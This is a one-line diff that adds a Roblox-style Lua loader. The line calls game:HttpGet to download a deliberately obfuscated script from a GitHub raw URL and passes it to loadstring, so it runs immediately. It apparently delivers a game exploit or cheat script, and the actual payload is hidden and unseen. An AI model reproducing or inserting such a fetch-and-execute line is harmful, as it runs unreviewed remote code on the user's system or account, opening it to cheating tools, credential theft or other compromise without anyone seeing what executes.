@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Duckycant/Points-new-one-/refs/heads/main/obf_KSaO8m28kNdlQz3A50eN3AkKe9sGU7Z5573ga9KCX51uZqMJ8L3q6VgOVBTDt8lX.lua.txt"))()
